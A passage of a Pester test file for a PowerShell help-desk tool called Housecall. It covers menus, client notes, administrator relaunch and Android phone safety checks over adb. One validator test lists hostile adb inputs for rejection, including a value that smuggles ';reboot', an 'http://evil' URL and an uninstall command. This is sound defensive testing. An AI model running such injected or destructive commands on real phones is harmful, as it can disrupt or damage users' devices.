        Start-Housecall -Lang nl -Answers @('F2', '1', 'j', '', 'U', 'j', 'Q')
        Assert-MockCalled Disable-ScheduledTask -Times 1 -Exactly -Scope It -ParameterFilter { $TaskName -eq 'Updater' -and $TaskPath -eq '\' }
        Assert-MockCalled Get-HcSecurityFacts -Times 2 -Exactly -Scope It      # once, then again as proof
        Assert-MockCalled Enable-ScheduledTask -Times 1 -Exactly -Scope It
        $script:TaskDisabled | Should Be $false
        $script:HcChanges.Count | Should Be 0
    }

    It 'changes nothing on N' {
        Start-Housecall -Lang en -Answers @('F2', '1', 'n', '', 'Q')
        Assert-MockCalled Disable-ScheduledTask -Times 0 -Exactly -Scope It
    }

    It 'changes nothing in a dry run, even after a yes' {
        Start-Housecall -Lang en -DryRun -Answers @('F2', '1', 'y', '', 'Q')
        Assert-MockCalled Disable-ScheduledTask -Times 0 -Exactly -Scope It
    }

    It 'refuses an admin fix without admin and explains how' {
        Mock Get-HcNetworkFacts { New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null } }
        Mock ipconfig.exe { }
        Start-Housecall -Lang en -Answers @('A1', '1', '', 'Q')
        Assert-MockCalled ipconfig.exe -Times 0 -Exactly -Scope It
    }
}

Describe 'The client note' {
    $script:Lang = 'nl'

    It 'is empty when no problem was opened' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        @(Get-HcNoteBlocks).Count | Should Be 0
    }

    It 'says what was asked, found and done, in the client''s language' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        $r = New-HcReport; Set-HcFinding $r 'cleanCall'
        Save-HcVisit 'F2' $r
        [void]$script:HcChanges.Add([pscustomobject]@{ FixId = 'disableTask'; Target = @{}; Label = 'Geplande taak "Updater" uitschakelen' })
        $text = @(Get-HcNoteBlocks ([datetime]'2026-09-26')) | ForEach-Object { "$($_.Style): $($_.Text)" }
        $text[0] | Should Be 'title: Housecall, 26 september 2026'
        $text -contains 'heading: Waar u hulp bij vroeg' | Should Be $true
        $text -contains 'text: Iemand belde mij en kwam in mijn computer' | Should Be $true
        $text -contains 'text: Geplande taak "Updater" uitschakelen' | Should Be $true
        $text[-1] | Should Match '^small: Dit briefje wordt nergens bewaard'
    }

    It 'keeps only the latest finding per problem' {
        $script:HcVisit.Clear()
        $before = New-HcReport; Set-HcFinding $before 'unknownTask' @('Updater')
        $after = New-HcReport; Set-HcFinding $after 'cleanCall'
        Save-HcVisit 'F2' $before
        Save-HcVisit 'F2' $after
        $script:HcVisit.Count | Should Be 1
        $script:HcVisit[0].FindingId | Should Be 'cleanCall'
    }

    It 'says nothing changed, and shows the contact line only when one is set' {
        $saved = $script:Contact
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        $r = New-HcReport; Set-HcFinding $r 'allGood'
        Save-HcVisit 'A1' $r
        $script:Contact = @()
        $texts = @(Get-HcNoteBlocks | ForEach-Object { $_.Text })
        $texts -contains 'Er is niets veranderd aan deze pc.' | Should Be $true
        $texts -contains 'Vragen?' | Should Be $false
        $script:Contact = @('Shamil: +31 6 00000000', 'test@example.com')
        $texts = @(Get-HcNoteBlocks | ForEach-Object { $_.Text })
        $texts -contains 'Vragen?' | Should Be $true
        $texts -contains 'Shamil: +31 6 00000000' | Should Be $true
        $texts -contains 'test@example.com' | Should Be $true
        $script:Contact = $saved
    }

    It 'keeps no contact in the public code: it comes from the business details, without the phone' {
        $saved = $script:Contact
        try {
            (Get-Content -Raw (Join-Path $root 'src\note.ps1')) | Should Not Match '@[a-z0-9-]+\.[a-z]{2,}'
            Set-HcContact ([pscustomobject]@{ owner_name = 'Jan'; email = 'jan@example.nl'; phone = '06-12345678' })
            @($script:Contact) | Should Be @('Jan: jan@example.nl')
            Set-HcContact ([pscustomobject]@{ owner_name = ''; email = 'jan@example.nl' })
            @($script:Contact) | Should Be @('jan@example.nl')
            Set-HcContact ([pscustomobject]@{ owner_name = 'Jan'; email = $null })
            @($script:Contact).Count | Should Be 0
        } finally { $script:Contact = $saved }
    }
}

Describe 'A copy on a USB stick' {
    $online = [pscustomobject]@{ Online = $true }
    It 'warns when GitHub has a newer build, and stays quiet otherwise' {
        $script:Lang = 'nl'
        $script:HcFromFile = $true; $script:HcBuild = 'aaaaaaaaaaaa'
        Mock Invoke-WebRequest { [pscustomobject]@{ Content = "bbbbbbbbbbbb`n" } }
        Get-HcOutdatedWarning $online | Should Match 'verouderd'
        Mock Invoke-WebRequest { [pscustomobject]@{ Content = "aaaaaaaaaaaa`n" } }
        Get-HcOutdatedWarning $online | Should Be $null
        # Through irm | iex it is always the newest: no check at all.
        $script:HcFromFile = $false
        Mock Invoke-WebRequest { throw 'should not be called' }
        Get-HcOutdatedWarning $online | Should Be $null
        # Offline, or no answer: it cannot tell, so it says nothing.
        $script:HcFromFile = $true
        Get-HcOutdatedWarning ([pscustomobject]@{ Online = $false }) | Should Be $null
        Get-HcOutdatedWarning $online | Should Be $null
        $script:HcFromFile = $false; $script:HcBuild = 'dev'
    }
}

Describe 'Offline at the start, internet fixed during the visit' {
    Mock Get-HcEnvironment {
        [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $true; Online = $false }
    }
    Mock Get-HcNetworkFacts {
        $script:FactsCalls++
        if ($script:FactsCalls -eq 1) { New-FakeFacts @{ IPv4 = '169.254.12.40'; Gateway = $null; InternetMs = -1; DnsOk = $false; Web = 'failed' } }
        else { New-FakeFacts }
    }
    Mock New-HcRestorePoint { }
    Mock Test-HcOnline { $true }

    It 'measures again after the fix, so Q still asks the code for the invoice' {
        $script:FactsCalls = 0
        $renew = $script:Fixes.renewIp.Apply
        $script:Fixes.renewIp.Apply = { param($t) }
        try {
            $out = Start-Housecall -Lang nl -Answers @('A1', '1', 'j', '', 'Q', '') 6>&1 | Out-String
        } finally { $script:Fixes.renewIp.Apply = $renew }
        $out | Should Match 'Internet bereikbaar'
        Assert-MockCalled Test-HcOnline -Times 1
        # Enter at the code: the plain note, but the code was asked, so the invoice was on offer.
        $out | Should Match 'Code uit Google Authenticator voor de factuur'
    }
}

Describe 'Restarting as administrator' {
    Mock Get-HcEnvironment {
        [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $false }
    }
    Mock Test-HcOnline { $false }
    Mock Get-HcNetworkFacts { New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null } }
    $newTemp = { @(Get-ChildItem $env:TEMP -Filter 'housecall-*.txt' -ErrorAction SilentlyContinue) }

    It 'offers a restart, starts an admin window at the same problem, and stops this one' {
        $script:HcSource = 'function Start-Housecall { }'
        $script:Launched = $null
        Mock Start-Process { $script:Launched = $ArgumentList }
        $before = @(& $newTemp).Count
        Start-Housecall -Lang en -Answers @('A1', '1', 'y', 'Q')
        Assert-MockCalled Start-Process -Times 1 -Exactly -Scope It -ParameterFilter { $Verb -eq 'RunAs' -and $FilePath -eq 'powershell.exe' }
        $script:HandedOff | Should Be $true
        $boot = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($script:Launched[-1]))
        $boot | Should Match "Start-Housecall -Start 'A1' -Lang 'en'"
        # Started from the text menu, the admin window is the text menu too.
        $boot | Should Match ' -Console'
        $boot | Should Match 'Remove-Item -LiteralPath'
        # The mock never ran the new window, so the hand-over file is still here: tidy it.
        $left = @(& $newTemp | Sort-Object LastWriteTime | Select-Object -Last 1)
        (@(& $newTemp).Count - $before) | Should Be 1
        [IO.File]::ReadAllText($left[0].FullName) | Should Be $script:HcSource
        Remove-Item $left[0].FullName
        $script:HcSource = $null
    }

    It 'cleans up and carries on when the person says No to Windows' {
        $script:HcSource = 'function Start-Housecall { }'
        Mock Start-Process { throw 'The operation was canceled by the user' }
        $before = @(& $newTemp).Count
        Start-Housecall -Lang en -Answers @('A1', '1', 'y', '', 'Q')
        $script:HandedOff | Should Be $false
        @(& $newTemp).Count | Should Be $before
        $script:HcSource = $null
    }

    It 'the start-up command really runs Housecall at the problem, and deletes the hand-over file' {
        $script:HcSource = Get-HcTestSource
        $script:Launched = $null
        Mock Start-Process { $script:Launched = $ArgumentList }
        Start-Housecall -Lang en -Answers @('A1', '1', 'y', 'Q')
        $script:HcSource = $null
        $encoded = $script:Launched[-1]
        $file = ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)) | Select-String "\`$f = '([^']+)'").Matches[0].Groups[1].Value
        Test-Path $file | Should Be $true
        # Run the same command without RunAs, in a fresh PowerShell with no console input.
        $out = & powershell.exe -NoProfile -NonInteractive -EncodedCommand $encoded 2>&1 | Out-String
        Test-Path $file | Should Be $false
        $out | Should Match 'A1  No internet at all'
        $out | Should Match 'What you asked for help with'
        $out | Should Not Match 'Exception|FullyQualifiedErrorId'
    }
}

Describe 'Findings' {
    It 'has a finding and an advice sentence, in both languages, for every finding id in the code' {
        $code = Get-Content (Join-Path $root 'src\checks\network.ps1') | Where-Object { $_ -match 'Set-HcFinding' }
        # The id right after "Set-HcFinding $r", or inside "{ 'id' }" when it is chosen by an if.
        $ids = @($code | ForEach-Object { [regex]::Matches($_, "(?:Set-HcFinding \`$r |\{ )'(\w+)'") | ForEach-Object { $_.Groups[1].Value } })
        $ids += $script:SecurityPriority
        $ids += @($script:SecurityChecks.Values | ForEach-Object { $_.Clean })
        # Area C names its findings as $found['id'], Set-HcFinding $r 'id', or the clean id last on Select-HcFinding.
        $ids += @('spaceFull', 'spaceLow')      # D4 renames diskFull / diskLow
        $ids += @(Get-Content (Join-Path $root 'src\checks\devices.ps1'), (Join-Path $root 'src\checks\sound.ps1'), (Join-Path $root 'src\checks\performance.ps1'), (Join-Path $root 'src\checks\updates.ps1'), (Join-Path $root 'src\checks\email.ps1'), (Join-Path $root 'src\checks\desktop.ps1'), (Join-Path $root 'src\checks\android.ps1'), (Join-Path $root 'src\checks\win11.ps1'), (Join-Path $root 'src\checks\comfort.ps1'), (Join-Path $root 'src\checks\daily.ps1'), (Join-Path $root 'src\checks\trouble.ps1') | ForEach-Object {
            [regex]::Matches($_, "\`$found\['(\w+)'\]|Set-HcFinding \`$r '(\w+)'|Select-HcFinding .* '(\w+)'\s*$") | ForEach-Object {
                @($_.Groups[1].Value, $_.Groups[2].Value, $_.Groups[3].Value) | Where-Object { $_ }
            }
        })
        $ids = $ids | Sort-Object -Unique
        $ids.Count | Should BeGreaterThan 25
        foreach ($lang in @('en', 'nl')) {
            foreach ($id in $ids) {
                $script:Strings[$lang]["finding.$id"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]["advice.$id"] | Should Not BeNullOrEmpty
            }
        }
    }

    It 'has no {0} placeholders in advice, which is shown without values' {
        foreach ($lang in @('en', 'nl')) {
            $bad = @($script:Strings[$lang].Keys | Where-Object { $_ -like 'advice.*' -and $script:Strings[$lang][$_] -match '\{\d\}' })
            ($bad -join ', ') | Should Be ''
        }
    }

    It 'fills the finding placeholders when printing' {
        $r = New-HcReport
        Set-HcFinding $r 'unstable' @(30)
        { Write-HcReport $r } | Should Not Throw
    }
}

Describe 'Source files' {
    It 'are plain ASCII, so PowerShell 5.1 reads them correctly' {
        $files = @(Get-ChildItem (Join-Path $root 'src') -Filter *.ps1 -Recurse) +
                 @(Get-Item (Join-Path $root 'dev.ps1'), (Join-Path $root 'build.ps1'), (Join-Path $root 'tools\setup-ai.ps1'), (Join-Path $root 'tools\setup-invoice.ps1'), (Join-Path $root 'tools\setup-mail.ps1'), (Join-Path $root 'tools\install-command.ps1'))
        foreach ($f in $files) {
            $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
            @($bytes | Where-Object { $_ -gt 127 }).Count | Should Be 0
        }
    }
}

Describe 'Start-Housecall (scripted run)' {
    Mock Get-HcEnvironment {
        [pscustomobject]@{
            IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'
            IsAdmin = $false; Online = $false
        }
    }
    Mock Test-HcOnline { $false }

    Mock Get-HcNetworkFacts { New-FakeFacts }
    Mock Get-HcConnectionQuality { [pscustomobject]@{ Sent = 10; Lost = 0; AverageMs = 4 } }
    Mock Get-HcWifiDrops { 2 }
    Mock Get-HcSiteFacts { [pscustomobject]@{ Host = 'nu.nl'; HostsEntry = $null; Address = '1.2.3.4'; TcpMs = 12; HttpStatus = 200 } }

    Mock Get-HcSecurityFacts { New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24') -Running $true) } }

    It 'walks the menu in English without errors and ends on Q' {
        { Start-Housecall -Lang en -Answers @('A', '1', '', '0', 'F2', '', '?', '', 'zz', 'Q') } | Should Not Throw
    }

    It 'runs F1, F2 and F3 from the menu' {
        { Start-Housecall -Lang nl -Answers @('F1', '', 'F2', '', 'F3', '', 'Q') } | Should Not Throw
        Assert-MockCalled Get-HcSecurityFacts -Times 3 -Exactly -Scope It
    }

    It 'runs A1, A2 and A3 from the menu' {
        { Start-Housecall -Lang nl -Answers @('A1', '', 'A2', '', 'A3', 'geen site', 'nu.nl', '', 'Q') } | Should Not Throw
        Assert-MockCalled Get-HcSiteFacts -Times 1 -Exactly
        Assert-MockCalled Get-HcConnectionQuality -Times 1 -Exactly
    }

    It 'switches language with L' {
        Start-Housecall -Lang en -Answers @('L', 'Q')
        $script:Lang | Should Be 'nl'
    }

    It 'sends a described problem to the AI chat screen' {
        { Start-Housecall -Lang nl -DryRun -Answers @('mijn printer doet het niet', '', 'Q') } | Should Not Throw
    }

    It 'stops by itself when the answers run out' {
        { Start-Housecall -Lang en -Answers @('A') } | Should Not Throw
    }

    It 'treats an unknown -Lang as "use the Windows language"' {
        Start-Housecall -Lang de -Answers @('Q')
        $script:Lang | Should Be (Get-HcDefaultLanguage)
        Start-Housecall -Lang NL -Answers @('Q')
        $script:Lang | Should Be 'nl'
    }
}

# The hosted file is fetched and run with `irm <url> | iex`, where the param
# block turns into plain variable declarations. Run the built bundle exactly
# that way, in a fresh non-interactive PowerShell (Read-Host fails there, so
# Housecall reads Q and closes).
Describe 'setup.ps1 (the file clients fetch)' {
    $bundle = Join-Path $root 'setup.ps1'

    It 'builds' {
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'build.ps1') | Out-Null
        $LASTEXITCODE | Should Be 0
        Test-Path $bundle | Should Be $true
    }

    It 'runs under a plain irm | iex' {
        $out = & powershell.exe -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '$bundle' -Raw | Invoke-Expression" 2>&1 | Out-String
        $out | Should Match 'Housecall'
        $out | Should Not Match 'Exception|FullyQualifiedErrorId'
        $out | Should Match 'Nothing was left behind|Er is niets achtergebleven'
    }

    It 'takes options through the scriptblock form' {
        $out = & powershell.exe -NoProfile -NonInteractive -Command "& ([scriptblock]::Create((Get-Content -LiteralPath '$bundle' -Raw))) -Lang nl -DryRun" 2>&1 | Out-String
        $out | Should Match 'PROEFDRAAI'
    }

    It 'takes options when run as a file, as from the USB stick' {
        # Nothing to read from the keyboard: Housecall shows the menu and stops.
        $out = cmd.exe /c "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$bundle`" -Lang nl -DryRun < NUL" 2>&1 | Out-String
        $out | Should Match 'PROEFDRAAI'
        $out | Should Match 'Waar gaat het probleem over'
    }
}

# A healthy phone on the cable on 5 Oct 2026; each scenario changes only what it is about.
function New-FakePhone {
    param([hashtable]$Change = @{})
    $f = [pscustomobject]@{
        AdbFound = $true; Devices = @([pscustomobject]@{ Serial = 'R58N12ABCDE'; State = 'device'; Model = 'SM A525F' })
        Serial = 'R58N12ABCDE'; Name = 'Samsung SM-A525F'; Now = [datetime]'2026-10-05 10:00'
        Android = '14'; Sdk = 34; Patch = [datetime]'2026-08-01'; RamKB = 5800000; RamFreeKB = 2100000; UptimeSec = 3 * 86400
        DataTotalKB = 110000000; DataFreeKB = 50000000
        Storage = [ordered]@{ photos = 12000000000; videos = 8000000000; apps = 6000000000; cache = 50000000 }
        Battery = [pscustomobject]@{ Level = 80; Health = 2; TempC = 29.5; Status = 3; Plugged = $false; Cycles = 310 }
        Apps = 64; AutoTime = '1'; AutoZone = '1'; Airplane = '0'; WifiOn = '1'; MobileData = '1'
        PrivateDns = 'opportunistic'; PrivateDnsHost = $null; ScreenTimeoutMs = 30000; PowerSave = '0'
        ClockOffsetSec = 2; PingIp = $true; PingName = $true; CablePhone = $null
        Packages = @([pscustomobject]@{ Package = 'com.whatsapp'; Installer = 'com.android.vending' }, [pscustomobject]@{ Package = 'nl.rabomobiel'; Installer = 'com.android.vending' })
        Accessibility = @('com.google.android.marvin.talkback'); Listeners = @('com.samsung.android.app.watchmanager'); Admins = @('com.google.android.gms')
        InstallAllowed = @(); PlayProtect = '1'
    }
    foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
    $f
}

Describe 'Area M: a phone through this laptop' {
    It 'asks to download the Android tool when it is missing' {
        $r = Test-HcPhoneOverview (New-FakePhone @{ AdbFound = $false; Devices = @() })
        $r.FindingId | Should Be 'adbMissing'
        @($r.Actions)[0].FixId | Should Be 'getAdb'
    }

    It 'tells apart no phone, a phone that has not allowed the laptop, and one that does not answer' {
        (Test-HcPhoneSlow (New-FakePhone @{ Devices = @() })).FindingId | Should Be 'phoneNotFound'
        $locked = @([pscustomobject]@{ Serial = 'R58'; State = 'unauthorized'; Model = '' })
        (Test-HcPhoneSlow (New-FakePhone @{ Devices = $locked })).FindingId | Should Be 'phoneUnauthorized'
        $silent = @([pscustomobject]@{ Serial = 'R58'; State = 'offline'; Model = '' })
        (Test-HcPhoneSlow (New-FakePhone @{ Devices = $silent })).FindingId | Should Be 'phoneOffline'
    }

    It 'recognises a phone on the cable by its maker, and not other devices of that maker' {
        $dev = { param($id, $code = 0) [pscustomobject]@{ DeviceId = $id; ErrorCode = $code } }
        (Find-HcUsbPhone @((& $dev 'USB\VID_046D&PID_C52B\5&1'), (& $dev 'USB\VID_04E8&PID_6860\R58N12ABCDE'))).Brand | Should Be 'Samsung'
        Find-HcUsbPhone @((& $dev 'USB\VID_04E8&PID_61F5\S6WBNJ0')) | Should Be $null
        Find-HcUsbPhone @((& $dev 'USB\VID_05AC&PID_024F\6&1')) | Should Be $null
        (Find-HcUsbPhone @((& $dev 'USB\VID_05AC&PID_12A8\00008110'))).Family | Should Be 'apple'
        (Find-HcUsbPhone @((& $dev 'USB\VID_18D1&PID_4EE7\2B0'))).Family | Should Be 'pixel'
        $xiaomi = Find-HcUsbPhone @((& $dev 'USB\VID_2717&PID_FF48\A1'), (& $dev 'USB\VID_2717&PID_FF48&MI_01\7&2' 28))
        $xiaomi.Brand | Should Be 'Xiaomi'
        $xiaomi.NoDriver | Should Be $true
        Find-HcUsbPhone @() | Should Be $null
    }

    It 'shows the brand''s own steps when USB debugging is still off' {
        $cable = { param($brand, $family, $noDriver = $false) New-FakePhone @{ Devices = @(); CablePhone = [pscustomobject]@{ Brand = $brand; Family = $family; NoDriver = $noDriver } } }
        $r = Test-HcPhoneOverview (& $cable 'Samsung' 'samsung')
        $r.FindingId | Should Be 'phoneDebuggingOffSamsung'
        $r.FindingArgs[0] | Should Be 'Samsung'
        (Get-HcSteps $r)[0] | Should Match 'Software'
        (Test-HcPhoneOverview (& $cable 'Xiaomi' 'xiaomi')).FindingId | Should Be 'phoneDebuggingOffXiaomi'
        (Test-HcPhoneOverview (& $cable 'Google' 'pixel')).FindingId | Should Be 'phoneDebuggingOffPixel'
        (Test-HcPhoneOverview (& $cable 'OnePlus' 'oppo')).FindingId | Should Be 'phoneDebuggingOffOppo'
        (Test-HcPhoneOverview (& $cable 'Motorola' 'other')).FindingId | Should Be 'phoneDebuggingOff'
        (Test-HcPhoneOverview (& $cable 'Samsung' 'samsung' $true)).FindingId | Should Be 'phoneNoDriver'
        (Test-HcPhoneOverview (& $cable 'Apple' 'apple')).FindingId | Should Be 'iphoneFound'
        $script:Lang = 'en'
        $r = Test-HcPhoneOverview (New-FakePhone @{ AdbFound = $false; Devices = @(); CablePhone = [pscustomobject]@{ Brand = 'Samsung'; Family = 'samsung'; NoDriver = $false } })
        $r.FindingId | Should Be 'adbMissing'
        (@($r.Results | ForEach-Object { $_.Text }) -join ' ') | Should Match 'Samsung phone found'
    }

    It 'finds apps that read the screen or messages, and is strongest about ones from outside a store' {
        $app = { param($pkg, $installer) [pscustomobject]@{ Package = $pkg; Installer = $installer } }
        $base = @((& $app 'com.whatsapp' 'com.android.vending'))
        $r = Test-HcPhoneSafety (New-FakePhone @{ Packages = $base + @((& $app 'com.fake.bankupdate' $null)); Accessibility = @('com.fake.bankupdate') })
        $r.FindingId | Should Be 'phoneMalwareLikely'
        $r.FindingArgs[0] | Should Be 'com.fake.bankupdate'
        @($r.Actions)[0].FixId | Should Be 'phoneOpenApp'
        @($r.Actions)[0].Target.Package | Should Be 'com.fake.bankupdate'
        (Test-HcPhoneSafety (New-FakePhone @{ Packages = $base + @((& $app 'com.fake.sms' 'com.google.android.packageinstaller')); Listeners = @('com.fake.sms') })).FindingId | Should Be 'phoneMalwareLikely'
        (Test-HcPhoneSafety (New-FakePhone @{ Packages = $base + @((& $app 'com.fake.admin' 'com.android.chrome')); Admins = @('com.fake.admin') })).FindingId | Should Be 'phoneMalwareLikely'
        $r = Test-HcPhoneSafety (New-FakePhone @{ Packages = $base + @((& $app 'com.x8bit.bitwarden' 'com.android.vending')); Accessibility = @('com.x8bit.bitwarden') })
        $r.FindingId | Should Be 'phoneAccessibilityApp'
        @($r.Results | Where-Object { $_.Status -eq 'problem' }).Count | Should Be 0
        (Test-HcPhoneSafety (New-FakePhone @{ Listeners = @('com.garmin.android.apps.connectmobile') })).FindingId | Should Be 'phoneNotifyApp'
        (Test-HcPhoneSafety (New-FakePhone @{ Admins = @('com.microsoft.windowsintune.companyportal') })).FindingId | Should Be 'phoneDeviceAdmin'
    }

    It 'finds remote-access apps, Play Protect off, apps from outside a store and apps that may install apps' {
        $script:Lang = 'en'
        $app = { param($pkg, $installer) [pscustomobject]@{ Package = $pkg; Installer = $installer } }
        $r = Test-HcPhoneSafety (New-FakePhone @{ Packages = @((& $app 'com.anydesk.anydeskandroid' 'com.android.vending')) })
        $r.FindingId | Should Be 'phoneRemoteApp'
        $r.FindingArgs[0] | Should Be 'AnyDesk'
        (Test-HcPhoneSafety (New-FakePhone @{ PlayProtect = '-1' })).FindingId | Should Be 'playProtectOff'
        $many = @(1..8 | ForEach-Object { & $app "com.apk.app$_" $null })
        $r = Test-HcPhoneSafety (New-FakePhone @{ Packages = $many })
        $r.FindingId | Should Be 'phoneSideloaded'
        $r.FindingArgs[0] | Should Be 8
        @($r.Actions | Where-Object { $_.FixId -eq 'phoneOpenApp' }).Count | Should Be 6
        (@($r.Results | ForEach-Object { $_.Text }) -join ' ') | Should Match '8 apps not installed from an app store: com\.apk\.app1, .*, \.\.\.'
        (Test-HcPhoneSafety (New-FakePhone @{ InstallAllowed = @('com.android.chrome', 'com.android.vending') })).FindingId | Should Be 'phoneUnknownSources'
        (Test-HcPhoneSafety (New-FakePhone @{ InstallAllowed = @('com.android.vending') })).FindingId | Should Be 'phoneSafeOk'
        $r = Test-HcPhoneSafety (New-FakePhone @{ Packages = $null; Admins = $null; InstallAllowed = $null })
        $r.FindingId | Should Be 'phoneSafeOk'
        @($r.Results | Where-Object { $_.Status -eq 'skipped' }).Count | Should Be 1
        # Shamil's phone (5 Oct): an empty Accessibility setting gave a nameless warning,
        # and web apps, Samsung's own apps and preinstalled Facebook counted as outside a store.
        $r = Test-HcPhoneSafety (New-FakePhone @{ Accessibility = $null; Listeners = $null; Admins = $null; InstallAllowed = $null
            Packages = @((& $app 'org.chromium.webapk.a6f1527fd51f32258_v2' 'com.android.chrome'), (& $app 'com.sec.android.app.kidshome' $null),
                         (& $app 'com.facebook.katana' 'com.facebook.system'), (& $app 'com.zq.juicychat' 'com.google.android.packageinstaller')) })
        @($r.Results | Where-Object { $_.Status -ne 'ok' } | ForEach-Object { $_.Text }) -join ' | ' | Should Be '1 apps not installed from an app store: com.zq.juicychat'
        # From a store, a maker's own installer, or the maker's own app: not "outside".
        Test-HcSideloaded 'com.sec.android.app.samsungapps' | Should Be $false
        Test-HcSideloaded 'com.samsung.android.app.omcagent' | Should Be $false
        Test-HcSideloaded 'com.whatsapp' | Should Be $true
        Test-HcSideloaded $null | Should Be $true
    }

    It 'reads the safety lists from adb' {
        (ConvertFrom-HcComponentList 'com.a.b/com.a.b.Svc:com.c.d/.Other:com.a.b/.Second') -join ',' | Should Be 'com.a.b,com.c.d'
        @(ConvertFrom-HcComponentList 'null').Count | Should Be 0
        $pk = @(ConvertFrom-HcPackageInstallers "package:com.whatsapp  installer=com.android.vending`npackage:com.apk.x  installer=null`npackage:com.old")
        $pk.Count | Should Be 3
        $pk[0].Installer | Should Be 'com.android.vending'
        $pk[1].Installer | Should Be $null
        $pk[2].Installer | Should Be $null
        $old = "Enabled Device Admins (User 0):`n  Admin (userId=0): ComponentInfo{com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver}"
        (ConvertFrom-HcDevicePolicy $old) -join ',' | Should Be 'com.google.android.gms'
        $new = "Current Device Policy Manager state:`n  Enabled Device Admins (User 0, provisioningState: 0):`n    com.google.android.gms/.mdm.receivers.MdmDeviceAdminReceiver:`n      uid=10154`n    com.fake.admin/.Admin:`n      uid=10300`nOther section:`n    com.not.admin/.X:"
        (ConvertFrom-HcDevicePolicy $new) -join ',' | Should Be 'com.google.android.gms,com.fake.admin'
        (ConvertFrom-HcPackageLines "com.android.chrome`ncom.sec.android.app.myfiles`n") -join ',' | Should Be 'com.android.chrome,com.sec.android.app.myfiles'
        foreach ($ok in 'shell settings get secure enabled_accessibility_services', 'shell settings get secure enabled_notification_listeners', 'shell pm list packages -3 -i',
                        'shell dumpsys device_policy', 'shell appops query-op REQUEST_INSTALL_PACKAGES allow', 'shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.fake.bankupdate') {
            "$ok $(Test-HcAdbAllowed $ok)" | Should Be "$ok True"
        }
        foreach ($bad in 'shell pm uninstall com.fake.bankupdate', 'shell pm disable-user com.x', 'shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.x;reboot',
                         'shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d http://evil', 'shell appops set com.x REQUEST_INSTALL_PACKAGES allow', 'shell settings get secure bluetooth_address') {
            "$bad $(Test-HcAdbAllowed $bad)" | Should Be "$bad False"
        }
    }

    It 'finds nothing on a healthy phone, and always offers to switch USB debugging off' {
        foreach ($test in 'Test-HcPhoneOverview', 'Test-HcPhoneSlow', 'Test-HcPhoneStorage', 'Test-HcPhoneBattery', 'Test-HcPhoneOnline', 'Test-HcPhoneUpdates', 'Test-HcPhoneSafety') {
            $r = & $test (New-FakePhone)
            "$test $($r.FindingId)" | Should Match 'Ok$'
            @($r.Actions | ForEach-Object { $_.FixId }) -contains 'phoneDebugOff' | Should Be $true
            @($r.Results | Where-Object { $_.Status -eq 'problem' }).Count | Should Be 0
        }
    }

    It 'reads storage that is full or getting full' {
        (Test-HcPhoneStorage (New-FakePhone @{ DataFreeKB = 5000000 })).FindingId | Should Be 'phoneStorageFull'
        (Test-HcPhoneStorage (New-FakePhone @{ DataTotalKB = 30000000; DataFreeKB = 800000 })).FindingId | Should Be 'phoneStorageFull'
        (Test-HcPhoneStorage (New-FakePhone @{ DataFreeKB = 18000000 })).FindingId | Should Be 'phoneStorageLow'
        (Test-HcPhoneSlow (New-FakePhone @{ DataFreeKB = 5000000 })).FindingId | Should Be 'phoneStorageFull'
    }

    It 'lists what takes the space, biggest first, without the tiny ones' {
        $script:Lang = 'en'
        $r = Test-HcPhoneStorage (New-FakePhone)
        $kinds = @($r.Results | Select-Object -Skip 3 | ForEach-Object { $_.Text })
        $kinds[0] | Should Match '^Photos'
        $kinds[1] | Should Match '^Videos'
        ($kinds -join ' ') | Should Not Match 'Temporary'
    }

    It 'finds slowness from memory, restarts and little memory' {
        (Test-HcPhoneSlow (New-FakePhone @{ RamFreeKB = 300000 })).FindingId | Should Be 'phoneMemoryFull'
        (Test-HcPhoneSlow (New-FakePhone @{ UptimeSec = 30 * 86400 })).FindingId | Should Be 'phoneLongUptime'
        (Test-HcPhoneSlow (New-FakePhone @{ RamKB = 1900000; RamFreeKB = 600000 })).FindingId | Should Be 'phoneLowRam'
    }

    It 'judges the Android version and the security update' {
        (Test-HcPhoneUpdates (New-FakePhone @{ Patch = [datetime]'2024-03-01' })).FindingId | Should Be 'phonePatchOld'
        (Test-HcPhoneUpdates (New-FakePhone @{ Patch = [datetime]'2026-01-05' })).FindingId | Should Be 'phonePatchStale'
        (Test-HcPhoneUpdates (New-FakePhone @{ Android = '9'; Sdk = 28; Patch = [datetime]'2021-01-01' })).FindingId | Should Be 'androidOld'
        @((Test-HcPhoneUpdates (New-FakePhone)).Actions)[0].FixId | Should Be 'phoneOpenUpdates'
    }

    It 'reads the battery' {
        $bat = { param($change) $b = [pscustomobject]@{ Level = 80; Health = 2; TempC = 29.5; Status = 3; Plugged = $false; Cycles = 310 }; foreach ($k in $change.Keys) { $b.$k = $change[$k] }; New-FakePhone @{ Battery = $b } }
        (Test-HcPhoneBattery (& $bat @{ Health = 3 })).FindingId | Should Be 'phoneBatteryBad'
        (Test-HcPhoneBattery (& $bat @{ TempC = 47.2 })).FindingId | Should Be 'phoneHot'
        (Test-HcPhoneBattery (& $bat @{ Cycles = 900 })).FindingId | Should Be 'phoneBatteryWorn'
        (Test-HcPhoneBattery (& $bat @{ Plugged = $true; Status = 4; Level = 40 })).FindingId | Should Be 'phoneNotCharging'
        (Test-HcPhoneBattery (& $bat @{ Plugged = $true; Status = 2 })).FindingId | Should Be 'phoneBatteryOk'
